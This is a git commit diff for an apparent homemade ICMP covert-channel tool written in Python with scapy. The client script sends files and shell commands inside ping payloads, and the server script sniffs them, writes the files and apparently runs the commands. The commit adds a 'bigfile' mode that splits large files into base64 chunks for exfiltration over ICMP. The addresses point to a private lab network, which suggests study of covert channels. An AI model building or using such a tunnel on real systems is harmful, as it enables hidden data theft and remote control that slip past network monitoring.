b95d0166f63df7e9fac2d070eca0ece145cc6d7c
bob <charlesdjfc@gmail.com>
2024-07-08 20:54:56 +0200

    bigfile

--- src/mathisClient.py
+++ src/mathisClient.py
@@ -1,13 +1,26 @@
 from scapy.all import *
 import base64
 
-destination = "192.168.18.1"
+destination = "192.168.56.1"
 sniffInterface = "eth0"
 
+CHUNK_SIZE = 1024
+
+def chunkstring(string, length):
+    return (string[0+i:length+i] for i in range(0, len(string), length))
+
+def read_in_chunks(file_object, chunk_size=1024):
+    """Lazy function (generator) to read a file piece by piece.
+    Default chunk size: 1k."""
+    while True:
+        data = file_object.read(chunk_size)
+        if not data:
+            break
+        yield data
 
 while True:
 
-    action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | message | command\n")
+    action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | bigfile | message | command\n")
 	
     if action == "file":
 		
@@ -22,6 +35,32 @@ while True:
         p = sr1(IP(dst=destination)/ICMP()/fileName)
         p = sr1(IP(dst=destination)/ICMP()/encoded)
 
+    elif action == "bigfile":
+        fileName = input("Which file should we send ?\n")
+        
+        print("Sending protocol and filename")
+        # Protocole : type d'envoi (file/message)
+        p = sr1(IP(dst=destination)/ICMP()/"bigfile")
+        p = sr1(IP(dst=destination)/ICMP()/fileName)
+
+        fileStats = os.stat(fileName)
+        print(f'File Size in Bytes is {fileStats.st_size}')
+        predictedNumberOfPings = math.ceil(fileStats.st_size / CHUNK_SIZE)
+
+        p = sr1(IP(dst=destination)/ICMP()/str(predictedNumberOfPings))
+
+        pingCounter = 0
+        with open(fileName,"rb") as f:
+            for piece in read_in_chunks(f, CHUNK_SIZE):
+                encoded = (base64.b64encode(piece)).decode('ascii')
+                p = send(IP(dst=destination)/ICMP()/encoded)
+                pingCounter = pingCounter + 1
+
+        print(f'Predicted number of pings to send: {predictedNumberOfPings}')
+        print("Number of pings sent: "+str(pingCounter))
+        print("Sending bigfileSTOP")
+        p = send(IP(dst=destination)/ICMP()/"bigfileSTOP")
+
     elif action == "command":
 
         command = input("What command should we run ?\n")
@@ -35,6 +74,7 @@ while True:
         base64Output = icmpReceived[0][3].fields.get("load").decode("utf-8")
         print(base64.b64decode(base64Output))
 	
+
 
     elif action == "message":
         print("Not implemented yet")
--- src/mathisServer.py
+++ src/mathisServer.py
@@ -2,8 +2,8 @@ from scapy.all import *
 import base64
 import subprocess
 
-sniffInterface = "VMware Network Adapter VMnet8"
-destination = "192.168.18.129"
+sniffInterface = "vboxnet0"
+destination = "192.168.56.103"
 
 while True:
     a = sniff(iface=sniffInterface, filter="icmp", count=1)
@@ -23,6 +23,50 @@ while True:
         print("base64File : "+base64File.decode("utf-8"))
         with open(fileName, "wb") as fh:
             fh.write(base64.decodebytes(base64File))
+
+    if receivedMessage == "bigfile":
+        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=4)        
+        fileName = icmpReceived[0][3].fields.get("load").decode("utf-8")
+        numberOfPingsToReceive = icmpReceived[2][3].fields.get("load").decode("utf-8")
+        numberOfPingsToReceive = int(numberOfPingsToReceive)
+        print(f'Number of pings to receive: {numberOfPingsToReceive}')
+        print(f'Filename: {fileName}')
+        data = b''
+        base64File = b''
+        pingCounter = 0
+        errorFlag = False
+
+        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=numberOfPingsToReceive*2)
+        for ping in icmpReceived:
+            data = ping[3].fields.get("load")
+            base64File += data
+            print(data.decode('utf-8'))
+
+
+        while data.decode("utf-8") == "zob":
+            print(f'Receiving part {str(pingCounter)}')
+            icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=2)
+            try:
+                data = icmpReceived[0][3].fields.get("load")
+            except:
+                errorFlag = True
+                print("ERROR IN RECEIVE")
+            #print("data="+data.decode("utf-8"))
+            if data.decode("utf-8") != "bigfileSTOP":
+                base64File += data
+            else:
+                print('Received bigfileSTOP')
+            pingCounter = pingCounter + 1
+        
+        if errorFlag:
+            print("Error in receive, file may be corrupted")
+        print(f'Number of pings received: {str(pingCounter)}')
+        print("fileName : "+fileName)
+        #print("base64File : "+base64File.decode("utf-8"))
+        with open(fileName, "wb") as fh:
+            fh.write(base64.decodebytes(base64File))
+
+        print(f'File {fileName} received')
 
     elif receivedMessage == "command":
         icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
